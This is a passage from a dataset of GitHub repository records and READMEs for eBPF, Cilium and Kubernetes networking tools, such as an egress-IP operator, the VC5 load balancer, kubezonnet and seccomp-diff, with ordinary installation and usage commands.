You can use this project to create a virtual IP that is moved from a node to another in case of failure. When kube-vip
associate a service to a node, it annotates associated service with kube-vip.io/vipHost: <node-name>. This operator
watches for this annotation and updates the CiliumEgressPolicy to select the node where the service is running and
implement a floating egress ip.

## Installation

You can use Helm and the default settings to install the operator:

```shell
helm upgrade -i cilium-haegress-operator --create-namespace --namespace egress-management
     oci://registry-1.docker.io/angeloxx/cilium-haegress-operator --version x.x.x-helm
```

## Configure

You can configure a new HAEgressGatewayPolicy using the following yaml:

```yaml
apiVersion: cilium.angeloxx.ch/v2
kind: HAEgressGatewayPolicy
metadata:
  annotations:
    kube-vip.io/loadbalancerIPs: 192.168.152.10
  name: egress-192-168-152-10
spec:
  destinationCIDRs:
    - 0.0.0.0/0
  egressGateway:
    nodeSelector:
      matchLabels:
        your.company/egress-node: ""true""
  selectors:
    - podSelector:
        matchLabels:
          io.kubernetes.pod.namespace: my-beautiful-namespace
```
Using the 

    kube-vip.io/loadbalancerIPs

annotation kube-vip will assign that IP but you can also omit the annotation and kube-vip will assign an IP from the
configured pool. The operator will create:

* a CiliumEgressGatewayPolicy named <service-namespace>-<haegressgatewaypolicy-name>
* a Service managed by Kube-VIP, with the same name in the operator namespace 

if you want to change the service namespace, you can use the annotation:

    cilium.angeloxx.ch/haegressgatewaypolicy-namespace: the-egress-namespace

and the service will be created in that namespace.

The Operator will link the service and the CiliumEgressGatewayPolicy; when the IP address is assigned, it will be configured as EgressIP and
when the services is assigned to a specific node, the CiliumEgressGatewayPolicy nodeSelector will be updated. 

All these three objects will be linked: if the HAEgressGatewayPolicy is deleted, the service and the CiliumEgressGatewayPolicy will be deleted too.
If the policy or the service is accidentally deleted, the operator will recreate and synchronize them.

## # Kubectl

You can check the status of the HAEgressIPs status using kubectl:

```shell
user@host:> kubectl get Haegressgatewaypolicies
NAME                     IP ADDRESS       EXIT NODE                      AGE
egress-192-168-152-10    192.168.152.10   egress-node-004.domain.local   77m
egress-192-168-152-11    192.168.152.11   egress-node-003.domain.local   76m
egress-192-168-152-12    192.168.152.12   egress-node-004.domain.local   76m
egress-192-168-152-13    192.168.152.13   egress-node-004.domain.local   77m
egress-192-168-152-15    192.168.152.15   egress-node-004.domain.local   76m
egress-192-168-152-18    192.168.152.18   egress-node-004.domain.local   76m
egress-192-168-152-19    192.168.152.19   egress-node-004.domain.local   77m
```
The status will report the name of the resource, the assigned IP by kube-vip, the node where the IP is assigned and when the last change has occurred.

## License

    Copyright (C) 2024 Angelo Conforti.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

"
yukinakanaka/tetragon-mini,26,0,26,0,Rust,Security Observation Tool written in Rust inspired by Tetragon,2024-12-26T08:48:54Z,2025-08-18T05:35:27Z,75,"# Tetragon-mini
- Rewriting [Tetragon](https://github.com/cilium/tetragon) in Rust.ðŸ¦€
- Security Observation Tool written in Rust aya framework.ðŸ

<img src=""docs/images/architecture.png"" width=""600"">

## Why ""mini""?
- It has fewer features compared to Tetragon.
- Compared to Tetragon, it has a smaller binary size (because it's written in Rust)

## Progress
![](https://geps.dev/progress/16)

### Done
- Simple Process Lifecycle Monitoring
- Integration with Kubernetes API
- Integration with CRI-O

## Process Lifecycle Monitoring
Tetragon-mini can monitor process lifecycle like bellow:
```
ðŸš€ process      1781470: root: /usr/bin/bash  default/nginx
ðŸ’¥ exit         1781560: root: /usr/bin/bash  default/nginx
ðŸ’¥ exit         1781470: root: /usr/bin/bash  default/nginx
ðŸš€ process      1781659: root: /usr/bin/bash  default/nginx
ðŸ’¥ exit         1781727: root: /usr/bin/date  default/nginx
ðŸš€ process      1781740: root: /usr/bin/ls -la default/nginx
ðŸ’¥ exit         1781740: root: /usr/bin/ls -la default/nginx
```

### TODO
-   Process LifeCycle Monitoring
    - Support containerd
    - Cgroup Tracker
-	Tracing Policies
-	Add more Tetra commands and options
-	Support multiple kernel versions
-	Enable running on Docker, Kubernetes
-	And moreâ€¦


## How to run
### Prerequisites
- Linux
- Rust nightly
- [bpf-linker](https://github.com/aya-rs/bpf-linker)
- [bindgen-cli](https://rust-lang.github.io/rust-bindgen/command-line-usage.html)

### Set up Lima VM on MacOS
If you're using MacOS, you can quickly set it up with lima and my template.
```
lima start lima/tetragon-mini-crio.yaml
```

### Installing ContainerRuntimeHook
tetragon-mini does not support dynamic configuration of the ContainerRuntimeHook. Please configure it manually according to your container runtime:
- CRI-O: Follow the instructions in [OCI Hook in CRI-O](./contrib/tetragon-rthooks/README.md)
- containerd: Not supported

### Build and Run
- Run the next command to generate the necessary Struct codes
```
cargo xtask codegen
```
- Build and Run eBPF Programs and Agent
```
cargo xtask run
```
- Build and Run client
```
cargo run --bin tetra
```

## Blog Posts
- [Tetragon-mini by Rust: eBPF-basedÂ process monitoring](https://yuki-nakamura.com/2024/12/27/tetragon-mini-by-rust-ebpf-based-process-monitoring/)
"
davidcoles/vc5,102,9,102,1,Go,A horizontally scalable Direct Server Return layer 4 load balancer for Linux using XDP/eBPF,2021-10-17T14:49:02Z,2025-10-09T01:31:59Z,311,"# VC5

<picture>
  <img src=""doc/vc5.drawio.png"" width=""25%"">
</picture>

**This README is currently being updated to reflect recent changes -
  some information may not reflect the current codebase. This
  iteration of code is not yet battle ready - use a v0.2 release for
  production**

A horizontally scalable Direct Server Return
([DSR](https://www.loadbalancer.org/blog/direct-server-return-is-simply-awesome-and-heres-why/))
layer 4 load balancer (L4LB) for Linux using [XDP/eBPF](https://www.datadoghq.com/blog/xdp-intro/).

If you think that this may be useful or have any
questions/suggestions, feel free to contact me at vc5lb@proton.me or
raise a GitHub issue.

**Now supports IPv6 and distribution at layer 3 (AKA
tunnelling)**! The XVS library has been updated to include these
features, and also does away with the need to run health checks from
a network namespace, considerably simplifying the code. This will end
the requirement that all backends share a VLAN with the load balancer.

Code restrictions currently mean that enabling tunnelling on a
per-service basis is not supported. Using the `-tunnel` option allows a
layer 3 tunnelling to be globally enabled using a single scheme
(IP-in-IP, GRE, FOU or GUE). Going forward, the code will be updated
to allow for tunnelling to be configured at the service level.

Layer 2 load balancing will continue to be supported - the primary
reason for starting the project was because of the lack of layer 2
support by [Facebook's
Katran](https://github.com/facebookincubator/katran) load
balancer.

A [sample IPv6/L3 configuration file](doc/ipv6-l3.yaml) is included -
better documentation to follow.


## About

VC5 is a network load balancer designed to work as replacement for
legacy hardware appliances. It allows services with virtual IP
addresses (VIPs) to be distributed to sets of backend (""real"")
servers. Real servers might run the services themselves or act as
proxies for another layer of servers (eg. HAProxy serving as a layer 7
HTTP router/SSL offload when application layer decisions need to
made). The only requirement being that VIPs need to be configured on a
loopback device on each real server, eg.: `ip addr add
192.168.101.1/32 dev lo`

Services and real servers are specified in a configuration file, along
with health check definitions. When the backend servers pass checks
and enough are available to provide a service, then virtual IP
addresses are advertised to routers via BGP.

Distributing traffic at both layer 2 and layer 3 is now
supported. Layer 2 distribution requires that real servers share a
VLAN with the load balancer; upon receiving a packet to be
distributed, the load balancer updates the ethernet hardware addresses
in the packet to use the real server's MAC address as the destination
and its own MAC address as the source, and forwards the packet via the
appropriate interface, updating the 802.1Q VLAN ID if packets are VLAN
tagged.

Layer 3 distribution requires packets to be encapsulated in a
tunneling protocol addressed to the real server IP and forwarded via a
router (unless the server and laod balancer share a VLAN). If, when
encapsulated, a packet exceeds the network maximum trasmission size
then an ICMP message is sent to the source with advice as to the
appropriate MTU to use. Backend servers only need to decapsulate
packets - bidirectional tunneling with load balancers is not required.

One server with a 10Gbit/s network interface should be capable of
supporting an HTTP service in excess of 100Gbit/s egress bandwidth due
to the asymmetric nature of most internet traffic. For smaller
services a modest virtual machine or two will likely handle a service
generating a number of gigabit/s of egress traffic.

If one instance is not sufficient then more servers may be added to
horizontally scale capacity (and provide redundancy) using your
router's ECMP feature. 802.3ad bonded interfaces and 802.1Q VLAN
trunking is supported (see [examples/](examples/) directory).

No kernel modules or complex setups are required, although for best
performance a network card driver with XDP native mode support is
recommended (eg.: mlx4, mlx5, i40e, ixgbe, ixgbevf, nfp, bnxt, thunder,
dpaa2, qede). A full list is availble at [The XDP Project's driver
support page](https://github.com/xdp-project/xdp-project/blob/master/areas/drivers/README.org).

## Goals/status

* âœ… Simple deployment with a single binary
* âœ… Stable backend selection with the Maglev hashing algorithm
* âœ… Route health injection handled automatically; no need to run other software such as ExaBGP
* âœ… Minimally invasive; does not require any modification of iptables rules on balancer
* âœ… No modification of backend servers beyond adding the VIP to a loopback device/tunnel termination with L3 distribution
* âœ… Health checks are run against the VIP on backend servers, not their real addresses
* âœ… HTTP/HTTPS, half-open SYN probe and UDP/TCP DNS health checks built in
* âœ… In-kernel packet switching with eBPF/XDP; native mode drivers avoid sk_buff allocation
* âœ… Multiple VLAN support
* âœ… Multiple NIC support for lower bandwidth/development applications
* âœ… Tagged/bonded network devices to support high-availibility/high-bandwidth
* âœ… Observability via a web console, Elasticsearch logging (in development) and Prometheus metrics
* âœ… IPv6 support and ability to mix IPv4 and IPv6 backends with either type of VIP.
* âœ… Layer 3 traffic distribution with IP-in-IP, GRE, FOU and GUE support.

## Quickstart

For best results you should disable/uninstall irqbalance.

You will need to select a primary IP to pass to the balancer. This is
used for the BGP router ID.

A simple example on a server with a single, untagged ethernet interface:

* `apt-get install git make libelf-dev golang-1.20 libyaml-perl libjson-perl ethtool` (or your distro's equivalent)
* `ln -s /usr/lib/go-1.20/bin/go /usr/local/bin/go` (ensure that the Go binary is in your path)
* `git clone https://github.com/davidcoles/vc5.git`
* `cd vc5/cmd`
* `cp config.sample.yaml config.yaml` (edit config.yaml to match your requirements)
* `make` (pulls down the [libbpf](https://github.com/libbpf/libbpf) library, builds the binary and JSON config file)
* `./vc5 10.1.10.100 config.json eth0` (amend to use your server's IP address and ethernet interface)
* A web console will be on your load balancer server's port 80 by default
* Add your VIP to the loopback device on your backend servers (eg.: `ip addr add 192.168.101.1/32 dev lo`)
* Configure your network/client to send traffic for your VIP to the load balancer, either via BGP (see config file) or static routing

It is almost certainly easier to use the binary from the latest Github
release (compiled for x86-64). This will have been tested in
production so should be reliable. Ensure that your configuration is
compatible with this version by using the config.pl script from the
tagged release (or, of course, you can build your own JSON config
however you prefer).

If you update the YAML config file and regenerate the JSON (`make
config.json`) you can reload the new configuration by sending an a
SIGINT (Ctrl-C) or SIGUSR2 to the process. SIGQUIT (Ctrl-\\) or SIGTERM
will cause the process to gracefully shut down BGP connections and
exit.

A more complex example with an LACP bonded ethernet device consisting
of two (10Gbps Intel X520 on my test server) interfaces, with native
XDP driver mode enabled and tagged VLANs:

`config.yaml` vlans entry: 

```
vlans:
  10: 10.1.10.0/24
  20: 10.1.20.0/24
  30: 10.1.30.0/24
```

Command line:

`./vc5 -n 10.1.10.100 config.json enp130s0f0 enp130s0f1`

The binary will detect your VLAN interfaces by looking for devices
with IP addreses which are contained in the VLAN prefixes in the
configuration file. If you use separate untagged physical interfaces
then this should now work transparently without any extra
configuration, just list all of the interfaces on the command line so
that the eBPF code is loaded into each of them.

Because connection state is tracked on a per-core basis
(BPF_MAP_TYPE_LRU_PERCPU_HASH), you should ensure that RSS ([Receive
Side
Scaling](https://www.kernel.org/doc/Documentation/networking/scaling.txt))
will consistently route packets for a flow to the same CPU core in the
event of your switch slecting a different interface when the LACP
topology changes. Disable irqbalance, ensure that channel settings are
the same on each interface (ethtool -l/-L) and that RSS flow hash
indirection matches (ethtool -x/-X).

The setup can be tested by starting a long running connection
(eg. using iperf with the -t option) to a set of backend servers, then
[disabling the chosen backend with an asterisk after the IP address in
the config file](doc/servers.md), determining which interface is
receiving the flow on the load balancer (eg., `watch -d 'cat
/proc/interrupts | grep enp130s0f'` and look for the rapidly
increasing IRQ counter) and then dropping this interface out of LACP
(`ifenslave -d bond0 enp130s0f0`). You should see the flow move to the
other network interface but still hit the same core.

When using backends in multiple subnets, for best performance you
should ensure that all VLANs are tagged on a single trunk interface
(LACP bonded if you have more than one physical interface) with
subnet/VLAN ID mappings specified in the `vlans` section of the config
file.

If this is not possible (for example creating trunked interfaces on
vSphere is not simple), then you can assign each subnet to a different
untagged interface:

`./vc5 10.1.10.100 config.json eth0 eth1 eth2`


## Background/more info

A good summary of the concepts in use are discussed in [Patrick
Shuff's ""Building a Billion User Load Balancer""
talk](https://www.youtube.com/watch?v=bxhYNfFeVF4&t=1060s) and [Nitika
Shirokov's Katran talk](https://www.youtube.com/watch?v=da9Qw7v5qLM)

A basic web console and Prometheus metrics server is included: ![Console screenshot](doc/console.jpg)

Experimental elasticsearch support for logging (direct to your
cluster, no need to scrape system logs) is now included. Every probe
to backend servers is logged, so if one goes down you can see
precisely what error was returned, as well all sorts of other
conditions. This will require a lot of refinement and more sensible
naming of log parameters, etc. (if you've got any insights please get
in touch), but it should lead to being able to get some good insights
into what is going on with the system - my very inept first attempt
creating a Kibana dashboard as an example: ![Kibana screenshot](doc/kibana.jpg)


## Performance

This has mostly been tested using Icecast backend servers with clients
pulling a mix of low and high bitrate streams (48kbps - 192kbps).

It seems that a VMWare guest (4 core, 8GB) using the XDP generic
driver will support 100K concurrent clients, 380Mbps/700Kpps through
the load balancer and 8Gbps of traffic from the backends directly to
the clients.

On a single (non-virtualised) Intel Xeon Gold 6314U CPU (2.30GHz 32
physical cores, with hyperthreading enabled for 64 logical cores) and
an Intel 10G 4P X710-T4L-t ethernet card, I was able to run 700K
streams at 2Gbps/3.8Mpps ingress traffic and 46.5Gbps egress. The
server was more than 90% idle. Unfortunately I did not have the
resources available to create more clients/servers.


## Operation

There are three modes of operation, simple, VLAN, and multi-NIC
based. In simple mode all hosts must be on the same subnet as the
primary address of the load balancer. In VLAN mode (enabled by
declaring entries under the ""vlans"" section of the YAML/JSON config
file), server entries must match a VLAN/CIDR subnet entry. VLAN tagged
interfaces need to be created in the OS and have an IP address
assigned within the subnet. In multi-NIC mode subnets are given IDs in
the same manner as VLANs, but bpf_redirect() is used to send traffic
out of the appropriately configured interface (rather than changing
the VLAN ID and using XDP_TX).

In VLAN mode, all traffic for the load balancer needs to be on a tagged VLAN (no
pushing or popping of 802.1Q is done - yet).


"
DualHorizon/blackpill,333,42,333,6,Rust,"A Linux kernel rootkit in Rust using a custom made type-2 hypervisor, eBPF XDP and TC programs",2024-09-19T09:10:45Z,2025-10-07T21:12:34Z,79,"> [!IMPORTANT]  
> This repository has moved and is now archived!
> <br></br>
> Please go to: https://github.com/rce-3/blackpill
"
KallDrexx/DotnetEbpf,21,0,21,0,C#,Write Linux eBPF applications in .net,2025-01-03T02:37:04Z,2025-09-01T01:47:04Z,30,"Prototype for creating Linux kernel eBPF applications using C#.

While the linux kernel's eBPF virtual machine does not natively support MSIL bytecode
generated by the C# compiler, we can transpile the MSIL bytecode into C and then
use native toolchains to compile that C into a valid Linux eBPF application that runs
inside the kernel.

This project provides a .net API for common eBPF functions. C# applications that are
written against these APIs are then able to utilize the [.net to c transpiler](https://github.com/KallDrexx/dntc)
to convert them into C code. Once in C, native Linux eBPF compilers can be used to
generate the resulting eBPF application.

# Limitations

Since Linux eBPF programs do not manual allow dynamic memory allocations, reference types
cannot be used when writing eBPF programs in C#. Therefore, any custom types you wish
to utilize must be `struct`s instead of `classes`.

# Getting Started

After cloning the repository, it is important to do a `git submodule update --recursive --init`
to ensure all dependencies have been downloaded from their respective repositories.

The [DotnetEbpf.Core C# Project](src/DotnetEbpf.Core) contains the common APIs which allow access
to eBPF functions.

# Examples

A few examples from the [libbpf-bootstrap repository](https://github.com/libbpf/libbpf-bootstrap)
have been ported over:

## Minimal

The [minimal](src/DotnetEbpf.Examples/Minimal.cs) example is the smallest practical eBPF application.
It demonstrates how to attach a tracepoint handler, using the `printk()` function to log values,
and read values passed in from the user space application.

The user space application which installs the eBPF application into the kernel is built from the
[minimal.c source file](examples/minimal.c).

To build and run the example:

```shell
cd examples
make minimal
sudo ./minimal

# In another shell
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

## uprobe

The [uprobe](src/DotnetEbpf.Examples/Uprobe.cs) example shows how to attach `uprobe` and
`uretprobe` traces to log arguments provided when a user space application calls specific
functions, as well as to log what values are returned from those function calls.

The user space application which installes the eBPF application into the kernel is built from
the [uprobe.c source file](examples/uprobe.c).

To build and run the example:

```shell
cd examples
make uprobe
sudo ./uprobe

# In another shell
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

## profile

The [profile](src/DotnetEbpf.Examples/Profile.cs) example shows how to implement a basic
profiler. It attaches to perf events and periodically samples these events on each processor.
It uses the rust [blazesym](https://github.com/libbpf/blazesym) library to show addresses,
symbols, file names, and line numbers of stack traces.

The user space application which installes the eBPF application into the kernel is built from
the [profile.c source file](examples/profile.c).

To build and run the example:

```shell
cd examples
make profile
sudo ./profile
```
"
polarsignals/kubezonnet,142,2,142,4,C,Monitor cross-zone network traffic in Kubernetes.,2024-12-06T15:14:41Z,2025-10-09T05:57:06Z,6,"# kubezonnet

**KUBE**rnetes cross-**ZON**e **NET**work monitoring with Prometheus for Cilium-based clusters (in Legacy host routing mode).

## Why?

While same-zone traffic is free on cloud providers, cross-zone traffic is not and can easily become a major cost factor if a lot of data is moved over the network. Therefore, understanding which workloads are causing cross-zone traffic is vital.

### Articles

Read The New Stack article: [eBPF Tool Identifies Cross-Zone Kubernetes Network Traffic](https://thenewstack.io/ebpf-tool-identifies-cross-zone-kubernetes-network-traffic/)  
Read our blog post: [kubezonnet: Monitor Cross-Zone Network Traffic in Kubernetes](https://www.polarsignals.com/blog/posts/2025/01/09/introducing-kubezonnet)

## Deploy

Kubezonnet is designed to be deployed on Kubernetes, so nothing special is required, just apply the manifests:

```bash
kubectl apply -f https://raw.githubusercontent.com/polarsignals/kubezonnet/refs/heads/main/deploy/kubezonnet.yaml
```

Container images are published at:
* agent: `ghcr.io/polarsignals/kubezonnet-agent`
* server: `ghcr.io/polarsignals/kubezonnet-server`

## Requirements

* Cilium as the CNI (in Legacy host routing mode, otherwise netfilter won't work correctly, GKE dataplane v2 clusters use this mode)
* Linux Kernel 6.4+ (netfilter eBPF programs were only added in 6.4)

## How does it work?

Kubezonnet is made up of two components:

* kubezonnet-agent: collects traffic statistics, using eBPF with a netfilter postrouting hook, about all Pod network traffic and sends the statistics to the server. This component is
 deployed on all nodes. It aggregates the statistics per source and destination IP and sends them to the server every 10 seconds.
* kubezonnet-server: aggregates the statistics sent from the agents and resolves the actual pod, node and zone relationships of the network statistics, and then exposes the statistic
s on a Prometheus metrics endpoint. This component can either be deployed once per cluster, or for each zone (once again to save cross-zone traffic).

## How do I use it?

### Metrics

The server portion of kubezonnet exposes a Prometheus metrics endpoint on port 8080, which can be scraped by Prometheus. Once set up the `pod_cross_zone_network_traffic_bytes_total`
counter will be available.

This will show the top 20 pods by cross-zone network traffic per second in the last 5 minutes, in megabytes.

```promql
topk(20, rate(pod_cross_zone_network_traffic_bytes_total[5m])) / 1e6
```

When trying to understand a cloud bill, the cumulative amount over a timeframe may be more interesting than the current usage. This query will show the top 20 pods by cross-zone netw
ork traffic in the last week, in gigabytes:

```promql
topk(20, increase(pod_cross_zone_network_traffic_bytes_total[1w])) / 1e9
```

### Logs

The server also logs something akin to flow logs, which can be used to understand the network traffic in more detail. They print the source and destination pods in addition to the ne
twork traffic associated whenever agents send statistics (every 10 seconds).

## Limitations

* Currently only supports IPv4.
* Traffic statistics use the IP packet sizes, therefore skip the IP header part. It's recommended to use these statistics to understand ratios of traffic and not use it for metering purposes or comparing them to other lower level network statistics that include the IP header.

## Roadmap

* Support for IPv6.
* Sum metrics by workload (deployment, statefulset, etc.), since pod granularity is not necessary to get the same insights and when higher granularity is needed, the logs can be used
.

## Acknowledgments

Various people have helped in the process of putting some of the pieces of this project together. In no particular order that includes, but is not limited to:

* [Dylan Reimerink](https://github.com/dylandreimerink)
* [Casey Callendrello](https://github.com/squeed)
* [Chance Zibolski](https://github.com/chancez)
* [Florian Lehner](https://github.com/florianl)
"
kubernetes-sigs/ingress2gateway,506,82,506,21,Go,Convert Ingress resources to Gateway API resources,2022-10-10T21:11:12Z,2025-10-03T20:53:14Z,259,"# Ingress to Gateway

Ingress2gateway helps translate Ingress and provider-specific
resources (CRDs) to Gateway API resources. Ingress2gateway is managed by the [Gateway
API](https://gateway-api.sigs.k8s.io/) SIG-Network subproject.

## Scope

Ingress2gateway is primarily focused on translating Ingress and provider-specific
resources(CRDs) to Gateway API resources. Widely used provider-specific annotations
and/or CRDs _may_ still not be supported. Please refer to
[supported providers](#supported-providers) for the current supported
providers and their documentation. Contributions for provider-specific
annotations and/or CRDs support are mostly welcomed as long as they can be
translated to [Gateway API](https://gateway-api.sigs.k8s.io/) directly.

> **Note:** Ingress2gateway is not intended to copy annotations from Ingress to Gateway
API.

## Supported providers

* [apisix](pkg/i2gw/providers/apisix/README.md)
* [cilium](pkg/i2gw/providers/cilium/README.md)
* [ingress-nginx](pkg/i2gw/providers/ingressnginx/README.md)
* [istio](pkg/i2gw/providers/istio/README.md)
* [gce](pkg/i2gw/providers/gce/README.md)
* [kong](pkg/i2gw/providers/kong/README.md)
* [nginx](pkg/i2gw/providers/nginx/README.md)
* [openapi](pkg/i2gw/providers/openapi3/README.md)

If your provider, or a specific feature, is not currently supported, please open
an issue and describe your use case.

To contribute a new provider support - please read [PROVIDER.md](PROVIDER.md).

## Installation

### Via go install

If you have a Go development environment locally, you can install ingress2gateway
with `go install github.com/kubernetes-sigs/ingress2gateway@v0.4.0`

This will put `ingress2gateway` binary in `$(go env GOPATH)/bin`

Alternatively, you can download the binary at the [releases page](https://github.com/kubernetes-sigs/ingress2gateway/releases)

### On macOS and linux via Homebrew

Make sure Homebrew is installed on your system.

```shell
brew install ingress2gateway
```

### Build from Source

1. Ensure that your system meets the following requirements:

   * Install Git: Make sure Git is installed on your system to clone the project
     repository.
   * Install Go: Make sure the go language is installed on your system. You can
     download it from the official website (https://golang.org/dl/) and follow the
     installation instructions.

1. Clone the project repository

   ```shell
   git clone https://github.com/kubernetes-sigs/ingress2gateway.git && cd ingress2gateway
   ```

1. Build the project

   ```shell
   make build
   ```

## Usage

Ingress2gateway reads Ingress resources and/or provider-specifc CRDs from a Kubernetes
cluster or a file. It will output the equivalent Gateway API resources in a YAML/JSON
format to stdout.  The simplest case is to convert all ingresses from one provider (in this example we use ingress-nginx):

```shell
./ingress2gateway print --providers=ingress-nginx
```

The above command will:

1. Read your Kube config file to extract the cluster credentials and the current
   active namespace.
1. Search for ingress-nginx resources in that namespace.
1. Convert them to Gateway-API resources (Currently only Gateways and HTTPRoutes).

## Options

### `print` command

| Flag           | Default Value           | Required | Description                                                  |
| -------------- | ----------------------- | -------- | ------------------------------------------------------------ |
| all-namespaces | False                   | No       | If present, list the requested object(s) across all namespaces. Namespace in the current context is ignored even if specified with --namespace. |
| input-file     |                         | No       | Path to the manifest file. When set, the tool will read ingresses from the file instead of reading from the cluster. Supported files are yaml and json. |
| namespace      |                         | No       | If present, the namespace scope for the invocation.           |
| openapi3-backend     |                         | No       | Provider-specific: openapi3. The name of the backend service to use in the HTTPRoutes. |
| openapi3-gateway-class-name     |                         | No       | Provider-specific: openapi3. The name of the gateway class to use in the Gateways. |
| openapi3-gateway-tls-secret     |                         | No       | Provider-specific: openapi3. The name of the secret for the TLS certificate references in the Gateways. |
| output         | yaml                    | No       | The output format, either yaml or json.                       |
| providers      |  | Yes       | Comma-separated list of providers. |
| kubeconfig     |                         | No       | The kubeconfig file to use when talking to the cluster. If the flag is not set, a set of standard locations can be searched for an existing kubeconfig file. |

## Conversion of Ingress resources to Gateway API

### Processing Order and Conflicts

Ingress resources will be processed with a defined order to ensure deterministic
generated Gateway API configuration.
This should also determine precedence order of Ingress resources and routes in case
of conflicts.

Ingress resources with the oldest creation timestamp will be sorted first and therefore
given precedence. If creation timestamps are equal, then sorting will be done based
on the namespace/name of the resources. If an Ingress rule conflicts with another
(e.g. same path match but different backends) an error will be reported for the
one that sorted later.

Since the Ingress v1 spec does not itself have a conflict resolution guide, we have
adopted this one. These rules are similar to the [Gateway API conflict resolution
guidelines](https://gateway-api.sigs.k8s.io/concepts/guidelines/#conflicts).

### Ingress resource fields to Gateway API fields

Given a set of Ingress resources, `ingress2gateway` will generate a Gateway with
various HTTP and HTTPS Listeners as well as HTTPRoutes that should represent equivalent
routing rules.

| Ingress Field                   | Gateway API configuration                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ingressClassName`              | If configured on an Ingress resource, this value will be used as the `gatewayClassName` set on the corresponding generated Gateway. `kubernetes.io/ingress.class` annotation has the same behavior.                                                                                                                                                                                                                                                                                                                                                                                                               |
| `defaultBackend`                | If present, this configuration will generate a Gateway Listener with no `hostname` specified as well as a catchall HTTPRoute that references this listener. The backend specified here will be translated to a HTTPRoute `rules[].backendRefs[]` element.                                                                                                                                                                                                                                                                                                                                                         |
| `tls[].hosts`                   | Each host in an IngressTLS will result in a HTTPS Listener on the generated Gateway with the following: `listeners[].hostname` = host as described, `listeners[].port` = `443`, `listeners[].protocol` = `HTTPS`, `listeners[].tls.mode` = `Terminate`                                                                                                                                                                                                                                                                                                                                                            |
| `tls[].secretName`              | The secret specified here will be referenced in the Gateway HTTPS Listeners mentioned above with the field `listeners[].tls.certificateRefs`. Each Listener for each host in an IngressTLS will get this secret.                                                                                                                                                                                                                                                                                                                                                                                                  |
| `rules[].host`                  | If non-empty, each distinct value for this field in the provided Ingress resources will result in a separate Gateway HTTP Listener with matching `listeners[].hostname`. `listeners[].port` will be set to `80` and `listeners[].protocol` set to `HTTPS`. In addition, Ingress rules with the same hostname will generate HTTPRoute rules in a HTTPRoute with `hostnames` containing it as the single element. If empty, similar to the `defaultBackend`, a Gateway Listener with no hostname configuration will be generated (if it doesn't exist) and routing rules will be generated in a catchall HTTPRoute. |
| `rules[].http.paths[].path`     | This field translates to a HTTPRoute `rules[].matches[].path.value` configuration.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| `rules[].http.paths[].pathType` | This field translates to a HTTPRoute `rules[].matches[].path.type` configuration. Ingress `Exact` = HTTPRoute `Exact` match. Ingress `Prefix` = HTTPRoute `PathPrefix` match.                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `rules[].http.paths[].backend`  | The backend specified here will be translated to a HTTPRoute `rules[].backendRefs[]` element.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |

## Get Involved

This project will be discussed in the same Slack channel and community meetings
as the rest of the Gateway API subproject. For more information, refer to the
[Gateway API Community](https://gateway-api.sigs.k8s.io/contributing/) page.

### Code of conduct

Participation in the Kubernetes community is governed by the [Kubernetes Code of
Conduct](code-of-conduct.md).
"
parttimenerd/ebpf-verifier-errors,43,1,43,10,,A project to collect eBPF verifier errors and how they can be resolved,2025-01-08T09:09:48Z,2025-09-28T19:39:13Z,18,"# A Collection of eBPF Verifier Errors

eBPF verifier errors can be cryptic and are often hard to understand.
So how can we help new developers when they encounter them?
Let's collect verifier error messages, their code context, 
and how they can be resolved.
This collection can then be searched by others and used
as a data source for tooling.

The errors are collected in the form of 
[issues](https://github.com/parttimenerd/ebpf-verifier-errors/issues) to this
repository.

Please consider submitting your verifier errors today.

## How to submit?

Just [create an issue with the ""New Verifier Error"" issue template](https://github.com/parttimenerd/ebpf-verifier-errors/issues/new?assignees=&labels=submisson&projects=&template=new-verifier-error.md):

[![image](https://github.com/user-attachments/assets/fd5c9585-640b-41ac-85f1-33bad87b9475)](https://github.com/parttimenerd/ebpf-verifier-errors/issues/new?assignees=&labels=submisson&projects=&template=new-verifier-error.md)

### How to get all issues?

You can use the following bash script to obtain
all currently available issues:

```sh
curl -s ""https://api.github.com/repos/parttimenerd/ebpf-verifier-errors/issues?labels=submission"" \
     | jq -r '.[] | ""\(.title)\n\(.body)\n-----""'
```

If you experience rate-limiting issues, try using a personal GitHub token:

```sh
curl -s -H ""Authorization: token your_github_token_here"" \
         ""https://api.github.com/repos/parttimenerd/ebpf-verifier-errors/issues?labels=submission"" \
     | jq -r '.[] | ""\(.title)\n\(.body)\n-----""'
```

## Contribute
To contribute to the repository other than submitting
verifier issues, please open a [GitHub Discussion](https://github.com/parttimenerd/ebpf-verifier-errors/discussions)
or a [pull request](https://github.com/parttimenerd/ebpf-verifier-errors/pulls).
We're happy for any issues template improvements or additions
of tools that use the data.

## License
GPLv2, this also includes the GitHub issues
"
antitree/seccomp-diff,84,2,84,0,Python,,2024-12-30T17:45:35Z,2025-09-18T11:31:18Z,109,"# Seccomp-Diff

Analyze binaries and containers to extract and disassemble seccomp-bpf profiles. 
This tools is designed to help you determine whether or not a given seccomp-bpf
profile is more or less constrained than others as well as give you the ground 
truth for the filters applied to a process.


#### Features:
- Extracts true seccomp filter from a process/container via `ptrace`
- Disassembles the seccomp-BPF filter for the given seccomp profile
- Lists all allowed and blocked syscalls based on the active seccomp profile.
- Reduces down the various actions (KILL_THREAD, KILL_PROCESS, ERRNO, BLOCK) into a restriction or an allowance for easier understanding
- Outputs a summary of system call rules for analysis.

![](/examples/demo_web.png)

## `seccomp_diff.py`

CLI tool that will diff two given containers' given seccomp profiles.

![](/examples/demo4.gif)

### Usage:
```
usage: seccomp_diff.py [-h] [-k] [-d]

Get container information from Docker or Kubernetes.

